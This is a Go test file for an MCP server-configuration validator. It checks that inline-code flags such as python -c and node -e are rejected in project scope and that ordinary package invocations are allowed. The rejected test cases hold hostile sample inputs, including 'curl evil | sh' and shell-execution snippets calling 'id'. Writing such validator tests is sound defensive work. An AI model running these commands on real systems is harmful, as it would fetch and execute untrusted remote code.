package mcp

import "testing"

func TestValidateMCPArgsRejectsInlineCodeForProjectScope(t *testing.T) {
	cases := []struct {
		name    string
		command string
		args    []string
	}{
		{"python -c", "python3", []string{"-c", "import os; os.system('id')"}},
		{"python --eval", "python", []string{"--eval=print(1)"}},
		{"node -e", "node", []string{"-e", "require('child_process').exec('id')"}},
		{"node --print", "node", []string{"--print=1"}},
		{"node.exe -e", "node.exe", []string{"-e", "1"}},
		{"deno eval", "deno", []string{"eval", "console.log(1)"}},
		{"ruby -e", "ruby", []string{"-e", "system('id')"}},
		{"npx -c", "npx", []string{"-c", "curl evil | sh"}},
		{"bun -e", "bun", []string{"-e", "Bun.spawn(['id'])"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := validateMCPArgs(tc.command, tc.args); err == nil {
				t.Fatalf("expected %s %v to be rejected", tc.command, tc.args)
			}
		})
	}
}

func TestValidateMCPArgsAllowsPackageInvocations(t *testing.T) {
	cases := []struct {
		command string
		args    []string
	}{
		{"npx", []string{"-y", "@modelcontextprotocol/server-filesystem", "."}},
		{"uvx", []string{"mcp-server-git"}},
		{"node", []string{"dist/index.js"}},
		{"python3", []string{"-m", "mcp_server"}},
		{"go", []string{"run", "./cmd/server"}},
	}
	for _, tc := range cases {
		if err := validateMCPArgs(tc.command, tc.args); err != nil {
			t.Fatalf("expected %s %v to be allowed, got %v", tc.command, tc.args, err)
		}
	}
}

func TestValidateMCPCommandScopes(t *testing.T) {
	if err := validateMCPCommand("/usr/bin/env", "project"); err == nil {
		t.Fatal("expected an unlisted command to be rejected in project scope")
	}
	if err := validateMCPCommand("/usr/bin/env", "user"); err != nil {
		t.Fatalf("user scope must not be restricted, got %v", err)
	}
	if err := validateMCPCommand("npx", "project"); err != nil {
		t.Fatalf("expected npx to be allowed, got %v", err)
	}
}
